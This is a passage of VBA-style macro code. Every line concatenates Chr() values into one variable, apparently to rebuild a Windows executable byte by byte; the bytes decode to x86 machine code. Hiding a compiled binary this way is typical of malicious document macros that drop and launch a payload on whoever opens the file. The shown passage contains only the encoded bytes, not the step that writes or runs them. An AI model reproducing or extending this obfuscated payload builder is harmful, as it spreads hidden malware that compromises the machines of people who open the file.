ySXd=ySXd&Chr(64)&Chr(0)&Chr(104)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(83)&Chr(255)&Chr(21)&Chr(216)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(8)&Chr(137)&Chr(61)&Chr(188)&Chr(178)&Chr(64)&Chr(0)&Chr(235)&Chr(21)&Chr(255)&Chr(21)&Chr(56)&Chr(128)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(120)&Chr(117)&Chr(10)&Chr(199)&Chr(5)&Chr(188)&Chr(178)&Chr(64)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(57)&Chr(93)&Chr(20)&Chr(126)&Chr(34)&Chr(139)&Chr(77)&Chr(20)&Chr(139)&Chr(69)&Chr(16)&Chr(73)&Chr(56)&Chr(24)&Chr(116)&Chr(8)&Chr(64)&Chr(59)&Chr(203)&Chr(117)&Chr(246)&Chr(131)&Chr(201)&Chr(255)&Chr(139)&Chr(69)&Chr(20)&Chr(43)&Chr(193)&Chr(72)&Chr(59)&Chr(69)&Chr(20)&Chr(125)&Chr(1)&Chr(64)&Chr(137)&Chr(69)&Chr(20)&Chr(161)&Chr(188)&Chr(178)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(2)&Chr(15)&Chr(132)&Chr(172)&Chr(1)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(59)&Chr(195)&Chr(15)&Chr(132)&Chr(164)&Chr(1)&Chr(0)&Chr(0)&Chr(131)&Chr(248)&Chr(1)&Chr(15)&Chr(133)&Chr(204)&Chr(1)&Chr(0)&Chr(0)&Chr(137)&Chr(93)&Chr(248)&Chr(57)&Chr(93)&Chr(32)&Chr(117)&Chr(8)&Chr(139)&Chr(6)&Chr(139)&Chr(64)&Chr(4)&Chr(137)&Chr(69)&Chr(32)&Chr(139)&Chr(53)&Chr(212)&Chr(128)&Chr(64)&Chr(0)&Chr(51)&Chr(192)&Chr(57)&Chr(93)&Chr(36)&Chr(83)&Chr(83)&Chr(255)&Chr(117)&Chr(20)&Chr(15)&Chr(149)&Chr(192)&Chr(255)&Chr(117)&Chr(16)&Chr(141)&Chr(4)&Chr(197)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(255)&Chr(117)&Chr(32)&Chr(255)&Chr(214)&Chr(139)&Chr(248)&Chr(59)&Chr(251)&Chr(15)&Chr(132)&Chr(143)&Chr(1)&Chr(0)&Chr(0)&Chr(126)&Chr(67)&Chr(106)&Chr(224)&Chr(51)&Chr(210)&Chr(88)&Chr(247)&Chr(247)&Chr(131)&Chr(248)&Chr(2)&Chr(114)&Chr(55)&Chr(141)&Chr(68)&Chr(63)&Chr(8)&Chr(61)&Chr(0)&Chr(4)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(119)&Chr(19)&Chr(232)&Chr(64)&Chr(22)&Chr(0)&Chr(0)&Chr(139)&Chr(196)&Chr(59)&Chr(195)&Chr(116)&Chr(28)&Chr(199)&Chr(0)&Chr(204)&Chr(204)&Chr(0)&Chr(0)&Chr(235)&Chr(17)&Chr(80)&Chr(232)&Chr(39)&Chr(5)&Chr(0)&Chr(0)&Chr(89)&Chr(59)&Chr(195)&Chr(116)&Chr(9)&Chr(199)&Chr(0)&Chr(221)&Chr(221)&Chr(0)&Chr(0)&Chr(131)&Chr(192)&Chr(8)&Chr(137)&Chr(69)&Chr(244)&Chr(235)&Chr(3)&Chr(137)&Chr(93)&Chr(244)&Chr(57)&Chr(93)&Chr(244)&Chr(15)&Chr(132)&Chr(62)&Chr(1)&Chr(0)&Chr(0)&Chr(87)&Chr(255)&Chr(117)&Chr(244)&Chr(255)&Chr(117)&Chr(20)&Chr(255)&Chr(117)&Chr(16)&Chr(106)&Chr(1)&Chr(255)&Chr(117)&Chr(32)&Chr(255)&Chr(214)&Chr(133)&Chr(192)&Chr(15)&Chr(132)&Chr(227)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(53)&Chr(216)&Chr(128)&Chr(64)&Chr(0)&Chr(83)&Chr(83)&Chr(87)&Chr(255)&Chr(117)&Chr(244)&Chr(255)&Chr(117)&Chr(12)&Chr(255)
ySXd=ySXd&Chr(117)&Chr(8)&Chr(255)&Chr(214)&Chr(139)&Chr(200)&Chr(137)&Chr(77)&Chr(248)&Chr(59)&Chr(203)&Chr(15)&Chr(132)&Chr(194)&Chr(0)&Chr(0)&Chr(0)&Chr(247)&Chr(69)&Chr(12)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(116)&Chr(41)&Chr(57)&Chr(93)&Chr(28)&Chr(15)&Chr(132)&Chr(176)&Chr(0)&Chr(0)&Chr(0)&Chr(59)&Chr(77)&Chr(28)&Chr(15)&Chr(143)&Chr(167)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(117)&Chr(28)&Chr(255)&Chr(117)&Chr(24)&Chr(87)&Chr(255)&Chr(117)&Chr(244)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(214)&Chr(233)&Chr(144)&Chr(0)&Chr(0)&Chr(0)&Chr(59)&Chr(203)&Chr(126)&Chr(69)&Chr(106)&Chr(224)&Chr(51)&Chr(210)&Chr(88)&Chr(247)&Chr(241)&Chr(131)&Chr(248)&Chr(2)&Chr(114)&Chr(57)&Chr(141)&Chr(68)&Chr(9)&Chr(8)&Chr(61)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(119)&Chr(22)&Chr(232)&Chr(129)&Chr(21)&Chr(0)&Chr(0)&Chr(139)
ySXd=ySXd&Chr(244)&Chr(59)&Chr(243)&Chr(116)&Chr(106)&Chr(199)&Chr(6)&Chr(204)&Chr(204)&Chr(0)&Chr(0)&Chr(131)&Chr(198)&Chr(8)&Chr(235)&Chr(26)&Chr(80)&Chr(232)&Chr(101)&Chr(4)&Chr(0)&Chr(0)&Chr(89)&Chr(59)&Chr(195)&Chr(116)&Chr(9)&Chr(199)&Chr(0)&Chr(221)&Chr(221)&Chr(0)&Chr(0)&Chr(131)&Chr(192)&Chr(8)&Chr(139)&Chr(240)&Chr(235)&Chr(2)&Chr(51)&Chr(246)&Chr(59)&Chr(243)&Chr(116)&Chr(65)&Chr(255)&Chr(117)&Chr(248)&Chr(86)&Chr(87)&Chr(255)&Chr(117)&Chr(244)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(21)&Chr(216)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(34)&Chr(83)&Chr(83)&Chr(57)&Chr(93)&Chr(28)&Chr(117)&Chr(4)&Chr(83)&Chr(83)&Chr(235)&Chr(6)&Chr(255)&Chr(117)&Chr(28)&Chr(255)&Chr(117)&Chr(24)&Chr(255)&Chr(117)&Chr(248)&Chr(86)&Chr(83)&Chr(255)&Chr(117)&Chr(32)&Chr(255)&Chr(21)&Chr(52)&Chr(128)&Chr(64)
ySXd=ySXd&Chr(0)&Chr(137)&Chr(69)&Chr(248)&Chr(86)&Chr(232)&Chr(184)&Chr(253)&Chr(255)&Chr(255)&Chr(89)&Chr(255)&Chr(117)&Chr(244)&Chr(232)&Chr(175)&Chr(253)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(248)&Chr(89)&Chr(233)&Chr(89)&Chr(1)&Chr(0)&Chr(0)&Chr(137)&Chr(93)&Chr(244)&Chr(137)&Chr(93)&Chr(240)&Chr(57)&Chr(93)&Chr(8)&Chr(117)&Chr(8)&Chr(139)&Chr(6)&Chr(139)&Chr(64)&Chr(20)&Chr(137)&Chr(69)&Chr(8)&Chr(57)&Chr(93)&Chr(32)&Chr(117)&Chr(8)&Chr(139)&Chr(6)&Chr(139)&Chr(64)&Chr(4)&Chr(137)&Chr(69)&Chr(32)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(4)&Chr(21)&Chr(0)&Chr(0)&Chr(89)&Chr(137)&Chr(69)&Chr(236)&Chr(131)&Chr(248)&Chr(255)&Chr(117)&Chr(7)&Chr(51)&Chr(192)&Chr(233)&Chr(33)&Chr(1)&Chr(0)&Chr(0)&Chr(59)&Chr(69)&Chr(32)&Chr(15)&Chr(132)&Chr(219)&Chr(0)&Chr(0)&Chr(0)&Chr(83)&Chr(83)&Chr(141)&Chr(77)&Chr(20)&Chr(81)&Chr(255)
ySXd=ySXd&Chr(117)&Chr(16)&Chr(80)&Chr(255)&Chr(117)&Chr(32)&Chr(232)&Chr(34)&Chr(21)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(24)&Chr(137)&Chr(69)&Chr(244)&Chr(59)&Chr(195)&Chr(116)&Chr(212)&Chr(139)&Chr(53)&Chr(208)&Chr(128)&Chr(64)&Chr(0)&Chr(83)&Chr(83)&Chr(255)&Chr(117)&Chr(20)&Chr(80)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(228)&Chr(255)&Chr(214)&Chr(137)&Chr(69)&Chr(248)&Chr(59)&Chr(195)&Chr(117)&Chr(7)&Chr(51)&Chr(246)&Chr(233)&Chr(183)&Chr(0)&Chr(0)&Chr(0)&Chr(126)&Chr(61)&Chr(131)&Chr(248)&Chr(224)&Chr(119)&Chr(56)&Chr(131)&Chr(192)&Chr(8)&Chr(61)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(119)&Chr(22)&Chr(232)&Chr(107)&Chr(20)&Chr(0)&Chr(0)&Chr(139)&Chr(252)&Chr(59)&Chr(251)&Chr(116)&Chr(221)&Chr(199)&Chr(7)&Chr(204)&Chr(204)&Chr(0)&Chr(0)&Chr(131)&Chr(199)&Chr(8)&Chr(235)&Chr(26)&Chr(80)&Chr(232)&Chr(79)&Chr(3)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(89)&Chr(59)&Chr(195)&Chr(116)&Chr(9)&Chr(199)&Chr(0)&Chr(221)&Chr(221)&Chr(0)&Chr(0)&Chr(131)&Chr(192)&Chr(8)&Chr(139)&Chr(248)&Chr(235)&Chr(2)&Chr(51)&Chr(255)&Chr(59)&Chr(251)&Chr(116)&Chr(180)&Chr(255)&Chr(117)&Chr(248)&Chr(83)&Chr(87)&Chr(232)&Chr(178)&Chr(251)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(255)&Chr(117)&Chr(248)&Chr(87)&Chr(255)&Chr(117)&Chr(20)&Chr(255)&Chr(117)&Chr(244)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(214)&Chr(137)&Chr(69)&Chr(248)&Chr(59)&Chr(195)&Chr(117)&Chr(4)&Chr(51)&Chr(246)&Chr(235)&Chr(37)&Chr(255)&Chr(117)&Chr(28)&Chr(141)&Chr(69)&Chr(248)&Chr(255)&Chr(117)&Chr(24)&Chr(80)&Chr(87)&Chr(255)&Chr(117)&Chr(32)&Chr(255)&Chr(117)&Chr(236)&Chr(232)&Chr(113)&Chr(20)&Chr(0)&Chr(0)&Chr(139)&Chr(240)&Chr(137)&Chr(117)&Chr(240)&Chr(131)&Chr(196)&Chr(24)&Chr(247)&Chr(222)&Chr(27)&Chr(246)
ySXd=ySXd&Chr(35)&Chr(117)&Chr(248)&Chr(87)&Chr(232)&Chr(141)&Chr(252)&Chr(255)&Chr(255)&Chr(89)&Chr(235)&Chr(26)&Chr(255)&Chr(117)&Chr(28)&Chr(255)&Chr(117)&Chr(24)&Chr(255)&Chr(117)&Chr(20)&Chr(255)&Chr(117)&Chr(16)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(21)&Chr(208)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(240)&Chr(57)&Chr(93)&Chr(244)&Chr(116)&Chr(9)&Chr(255)&Chr(117)&Chr(244)&Chr(232)&Chr(240)&Chr(229)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(69)&Chr(240)&Chr(59)&Chr(195)&Chr(116)&Chr(12)&Chr(57)&Chr(69)&Chr(24)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(221)&Chr(229)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(198)&Chr(141)&Chr(101)&Chr(224)&Chr(95)&Chr(94)&Chr(91)&Chr(139)&Chr(77)&Chr(252)&Chr(51)&Chr(205)&Chr(232)&Chr(133)&Chr(248)&Chr(255)&Chr(255)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(16)&Chr(255)
ySXd=ySXd&Chr(117)&Chr(8)&Chr(141)&Chr(77)&Chr(240)&Chr(232)&Chr(224)&Chr(221)&Chr(255)&Chr(255)&Chr(255)&Chr(117)&Chr(40)&Chr(141)&Chr(77)&Chr(240)&Chr(255)&Chr(117)&Chr(36)&Chr(255)&Chr(117)&Chr(32)&Chr(255)&Chr(117)&Chr(28)&Chr(255)&Chr(117)&Chr(24)&Chr(255)&Chr(117)&Chr(20)&Chr(255)&Chr(117)&Chr(16)&Chr(255)&Chr(117)&Chr(12)&Chr(232)&Chr(40)&Chr(252)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(32)&Chr(128)&Chr(125)&Chr(252)&Chr(0)&Chr(116)&Chr(7)&Chr(139)&Chr(77)&Chr(248)&Chr(131)&Chr(97)&Chr(112)&Chr(253)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(81)&Chr(81)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(51)&Chr(197)&Chr(137)&Chr(69)&Chr(252)&Chr(161)&Chr(192)&Chr(178)&Chr(64)&Chr(0)&Chr(83)&Chr(86)&Chr(51)&Chr(219)&Chr(87)&Chr(139)&Chr(249)&Chr(59)&Chr(195)&Chr(117)&Chr(58)&Chr(141)&Chr(69)&Chr(248)&Chr(80)&Chr(51)&Chr(246)&Chr(70)
ySXd=ySXd&Chr(86)&Chr(104)&Chr(224)&Chr(136)&Chr(64)&Chr(0)&Chr(86)&Chr(255)&Chr(21)&Chr(224)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(8)&Chr(137)&Chr(53)&Chr(192)&Chr(178)&Chr(64)&Chr(0)&Chr(235)&Chr(52)&Chr(255)&Chr(21)&Chr(56)&Chr(128)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(120)&Chr(117)&Chr(10)&Chr(106)&Chr(2)&Chr(88)&Chr(163)&Chr(192)&Chr(178)&Chr(64)&Chr(0)&Chr(235)&Chr(5)&Chr(161)&Chr(192)&Chr(178)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(2)&Chr(15)&Chr(132)&Chr(207)&Chr(0)&Chr(0)&Chr(0)&Chr(59)&Chr(195)&Chr(15)&Chr(132)&Chr(199)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(248)&Chr(1)&Chr(15)&Chr(133)&Chr(232)&Chr(0)&Chr(0)&Chr(0)&Chr(137)&Chr(93)&Chr(248)&Chr(57)&Chr(93)&Chr(24)&Chr(117)&Chr(8)&Chr(139)&Chr(7)&Chr(139)&Chr(64)&Chr(4)&Chr(137)&Chr(69)&Chr(24)&Chr(139)&Chr(53)&Chr(212)&Chr(128)&Chr(64)&Chr(0)&Chr(51)
ySXd=ySXd&Chr(192)&Chr(57)&Chr(93)&Chr(32)&Chr(83)&Chr(83)&Chr(255)&Chr(117)&Chr(16)&Chr(15)&Chr(149)&Chr(192)&Chr(255)&Chr(117)&Chr(12)&Chr(141)&Chr(4)&Chr(197)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(255)&Chr(117)&Chr(24)&Chr(255)&Chr(214)&Chr(139)&Chr(248)&Chr(59)&Chr(251)&Chr(15)&Chr(132)&Chr(171)&Chr(0)&Chr(0)&Chr(0)&Chr(126)&Chr(60)&Chr(129)&Chr(255)&Chr(240)&Chr(255)&Chr(255)&Chr(127)&Chr(119)&Chr(52)&Chr(141)&Chr(68)&Chr(63)&Chr(8)&Chr(61)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(119)&Chr(19)&Chr(232)&Chr(132)&Chr(18)&Chr(0)&Chr(0)&Chr(139)&Chr(196)&Chr(59)&Chr(195)&Chr(116)&Chr(28)&Chr(199)&Chr(0)&Chr(204)&Chr(204)&Chr(0)&Chr(0)&Chr(235)&Chr(17)&Chr(80)&Chr(232)&Chr(107)&Chr(1)&Chr(0)&Chr(0)&Chr(89)&Chr(59)&Chr(195)&Chr(116)&Chr(9)&Chr(199)&Chr(0)&Chr(221)&Chr(221)&Chr(0)&Chr(0)&Chr(131)&Chr(192)&Chr(8)&Chr(139)&Chr(216)
ySXd=ySXd&Chr(133)&Chr(219)&Chr(116)&Chr(105)&Chr(141)&Chr(4)&Chr(63)&Chr(80)&Chr(106)&Chr(0)&Chr(83)&Chr(232)&Chr(208)&Chr(249)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(87)&Chr(83)&Chr(255)&Chr(117)&Chr(16)&Chr(255)&Chr(117)&Chr(12)&Chr(106)&Chr(1)&Chr(255)&Chr(117)&Chr(24)&Chr(255)&Chr(214)&Chr(133)&Chr(192)&Chr(116)&Chr(17)&Chr(255)&Chr(117)&Chr(20)&Chr(80)&Chr(83)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(21)&Chr(224)&Chr(128)&Chr(64)&Chr(0)&Chr(137)&Chr(69)&Chr(248)&Chr(83)&Chr(232)&Chr(201)&Chr(250)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(248)&Chr(89)&Chr(235)&Chr(117)&Chr(51)&Chr(246)&Chr(57)&Chr(93)&Chr(28)&Chr(117)&Chr(8)&Chr(139)&Chr(7)&Chr(139)&Chr(64)&Chr(20)&Chr(137)&Chr(69)&Chr(28)&Chr(57)&Chr(93)&Chr(24)&Chr(117)&Chr(8)&Chr(139)&Chr(7)&Chr(139)&Chr(64)&Chr(4)&Chr(137)&Chr(69)&Chr(24)&Chr(255)&Chr(117)&Chr(28)&Chr(232)&Chr(37)
ySXd=ySXd&Chr(18)&Chr(0)&Chr(0)&Chr(89)&Chr(131)&Chr(248)&Chr(255)&Chr(117)&Chr(4)&Chr(51)&Chr(192)&Chr(235)&Chr(71)&Chr(59)&Chr(69)&Chr(24)&Chr(116)&Chr(30)&Chr(83)&Chr(83)&Chr(141)&Chr(77)&Chr(16)&Chr(81)&Chr(255)&Chr(117)&Chr(12)&Chr(80)&Chr(255)&Chr(117)&Chr(24)&Chr(232)&Chr(77)&Chr(18)&Chr(0)&Chr(0)&Chr(139)&Chr(240)&Chr(131)&Chr(196)&Chr(24)&Chr(59)&Chr(243)&Chr(116)&Chr(220)&Chr(137)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(20)&Chr(255)&Chr(117)&Chr(16)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(117)&Chr(28)&Chr(255)&Chr(21)&Chr(220)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(248)&Chr(59)&Chr(243)&Chr(116)&Chr(7)&Chr(86)&Chr(232)&Chr(222)&Chr(227)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(199)&Chr(141)&Chr(101)&Chr(236)&Chr(95)&Chr(94)&Chr(91)&Chr(139)&Chr(77)&Chr(252)&Chr(51)&Chr(205)&Chr(232)&Chr(134)&Chr(246)&Chr(255)&Chr(255)
ySXd=ySXd&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(16)&Chr(255)&Chr(117)&Chr(8)&Chr(141)&Chr(77)&Chr(240)&Chr(232)&Chr(225)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(117)&Chr(36)&Chr(141)&Chr(77)&Chr(240)&Chr(255)&Chr(117)&Chr(32)&Chr(255)&Chr(117)&Chr(28)&Chr(255)&Chr(117)&Chr(24)&Chr(255)&Chr(117)&Chr(20)&Chr(255)&Chr(117)&Chr(16)&Chr(255)&Chr(117)&Chr(12)&Chr(232)&Chr(22)&Chr(254)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(28)&Chr(128)&Chr(125)&Chr(252)&Chr(0)&Chr(116)&Chr(7)&Chr(139)&Chr(77)&Chr(248)&Chr(131)&Chr(97)&Chr(112)&Chr(253)&Chr(201)&Chr(195)&Chr(106)&Chr(12)&Chr(104)&Chr(232)&Chr(148)&Chr(64)&Chr(0)&Chr(232)&Chr(16)&Chr(204)&Chr(255)&Chr(255)&Chr(131)&Chr(101)&Chr(228)&Chr(0)&Chr(139)&Chr(117)&Chr(8)&Chr(59)&Chr(53)&Chr(184)&Chr(182)&Chr(64)&Chr(0)&Chr(119)&Chr(34)&Chr(106)&Chr(4)&Chr(232)&Chr(74)&Chr(208)
ySXd=ySXd&Chr(255)&Chr(255)&Chr(89)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(86)&Chr(232)&Chr(48)&Chr(243)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(69)&Chr(228)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(9)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(228)&Chr(232)&Chr(28)&Chr(204)&Chr(255)&Chr(255)&Chr(195)&Chr(106)&Chr(4)&Chr(232)&Chr(69)&Chr(207)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(139)&Chr(117)&Chr(8)&Chr(131)&Chr(254)&Chr(224)&Chr(15)&Chr(135)&Chr(161)&Chr(0)&Chr(0)&Chr(0)&Chr(83)&Chr(87)&Chr(139)&Chr(61)&Chr(184)&Chr(128)&Chr(64)&Chr(0)&Chr(131)&Chr(61)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(0)&Chr(117)&Chr(24)&Chr(232)&Chr(212)&Chr(188)&Chr(255)&Chr(255)&Chr(106)&Chr(30)&Chr(232)&Chr(34)&Chr(187)&Chr(255)&Chr(255)&Chr(104)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(232)
ySXd=ySXd&Chr(100)&Chr(184)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(161)&Chr(204)&Chr(182)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(1)&Chr(117)&Chr(14)&Chr(133)&Chr(246)&Chr(116)&Chr(4)&Chr(139)&Chr(198)&Chr(235)&Chr(3)&Chr(51)&Chr(192)&Chr(64)&Chr(80)&Chr(235)&Chr(28)&Chr(131)&Chr(248)&Chr(3)&Chr(117)&Chr(11)&Chr(86)&Chr(232)&Chr(83)&Chr(255)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(117)&Chr(22)&Chr(133)&Chr(246)&Chr(117)&Chr(1)&Chr(70)&Chr(131)&Chr(198)&Chr(15)&Chr(131)&Chr(230)&Chr(240)&Chr(86)&Chr(106)&Chr(0)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(215)&Chr(139)&Chr(216)&Chr(133)&Chr(219)&Chr(117)&Chr(46)&Chr(106)&Chr(12)&Chr(94)&Chr(57)&Chr(5)&Chr(236)&Chr(181)&Chr(64)&Chr(0)&Chr(116)&Chr(21)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(206)&Chr(214)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(15)&Chr(139)&Chr(117)
ySXd=ySXd&Chr(8)&Chr(233)&Chr(123)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(75)&Chr(209)&Chr(255)&Chr(255)&Chr(137)&Chr(48)&Chr(232)&Chr(68)&Chr(209)&Chr(255)&Chr(255)&Chr(137)&Chr(48)&Chr(95)&Chr(139)&Chr(195)&Chr(91)&Chr(235)&Chr(20)&Chr(166)&Chr(232)&Chr(167)&Chr(214)&Chr(255)&Chr(255)&Chr(89)&Chr(232)&Chr(48)&Chr(209)&Chr(255)&Chr(255)&Chr(199)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(94)&Chr(93)&Chr(195)&Chr(106)&Chr(12)&Chr(104)&Chr(8)&Chr(149)&Chr(64)&Chr(0)&Chr(232)&Chr(247)&Chr(202)&Chr(255)&Chr(255)&Chr(139)&Chr(77)&Chr(8)&Chr(51)&Chr(255)&Chr(59)&Chr(207)&Chr(118)&Chr(46)&Chr(106)&Chr(224)&Chr(88)&Chr(51)&Chr(210)&Chr(247)&Chr(241)&Chr(59)&Chr(69)&Chr(12)&Chr(27)&Chr(192)&Chr(64)&Chr(117)&Chr(31)&Chr(232)&Chr(252)&Chr(208)&Chr(255)&Chr(255)&Chr(199)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(87)&Chr(87)&Chr(87)&Chr(87)
ySXd=ySXd&Chr(87)&Chr(232)&Chr(132)&Chr(208)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(20)&Chr(51)&Chr(192)&Chr(233)&Chr(213)&Chr(0)&Chr(0)&Chr(0)&Chr(15)&Chr(175)&Chr(77)&Chr(12)&Chr(139)&Chr(241)&Chr(137)&Chr(117)&Chr(8)&Chr(59)&Chr(247)&Chr(117)&Chr(3)&Chr(51)&Chr(246)&Chr(70)&Chr(51)&Chr(219)&Chr(137)&Chr(93)&Chr(228)&Chr(131)&Chr(254)&Chr(224)&Chr(119)&Chr(105)&Chr(131)&Chr(61)&Chr(204)&Chr(182)&Chr(64)&Chr(0)&Chr(3)&Chr(117)&Chr(75)&Chr(131)&Chr(198)&Chr(15)&Chr(131)&Chr(230)&Chr(240)&Chr(137)&Chr(117)&Chr(12)&Chr(139)&Chr(69)&Chr(8)&Chr(59)&Chr(5)&Chr(184)&Chr(182)&Chr(64)&Chr(0)&Chr(119)&Chr(55)&Chr(106)&Chr(4)&Chr(232)&Chr(210)&Chr(206)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(125)&Chr(252)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(183)&Chr(241)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(69)&Chr(228)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)
ySXd=ySXd&Chr(255)&Chr(232)&Chr(95)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(93)&Chr(228)&Chr(59)&Chr(223)&Chr(116)&Chr(17)&Chr(255)&Chr(117)&Chr(8)&Chr(87)&Chr(83)&Chr(232)&Chr(13)&Chr(247)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(59)&Chr(223)&Chr(117)&Chr(97)&Chr(86)&Chr(106)&Chr(8)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(184)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(216)&Chr(59)&Chr(223)&Chr(117)&Chr(76)&Chr(57)&Chr(61)&Chr(236)&Chr(181)&Chr(64)&Chr(0)&Chr(116)&Chr(51)&Chr(86)&Chr(232)&Chr(190)&Chr(213)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(15)&Chr(133)&Chr(114)&Chr(255)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(16)&Chr(59)&Chr(199)&Chr(15)&Chr(132)&Chr(80)&Chr(255)&Chr(255)&Chr(255)&Chr(199)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(233)&Chr(69)&Chr(255)&Chr(255)&Chr(255)&Chr(51)&Chr(255)&Chr(139)&Chr(117)
ySXd=ySXd&Chr(12)&Chr(106)&Chr(4)&Chr(232)&Chr(118)&Chr(205)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(59)&Chr(223)&Chr(117)&Chr(13)&Chr(139)&Chr(69)&Chr(16)&Chr(59)&Chr(199)&Chr(116)&Chr(6)&Chr(199)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(195)&Chr(232)&Chr(43)&Chr(202)&Chr(255)&Chr(255)&Chr(195)&Chr(106)&Chr(16)&Chr(104)&Chr(40)&Chr(149)&Chr(64)&Chr(0)&Chr(232)&Chr(217)&Chr(201)&Chr(255)&Chr(255)&Chr(139)&Chr(93)&Chr(8)&Chr(133)&Chr(219)&Chr(117)&Chr(14)&Chr(255)&Chr(117)&Chr(12)&Chr(232)&Chr(253)&Chr(253)&Chr(255)&Chr(255)&Chr(89)&Chr(233)&Chr(204)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(117)&Chr(12)&Chr(133)&Chr(246)&Chr(117)&Chr(12)&Chr(83)&Chr(232)&Chr(34)&Chr(225)&Chr(255)&Chr(255)&Chr(89)&Chr(233)&Chr(183)&Chr(1)&Chr(0)&Chr(0)&Chr(131)&Chr(61)&Chr(204)&Chr(182)&Chr(64)&Chr(0)&Chr(3)&Chr(15)&Chr(133)&Chr(147)&Chr(1)&Chr(0)&Chr(0)
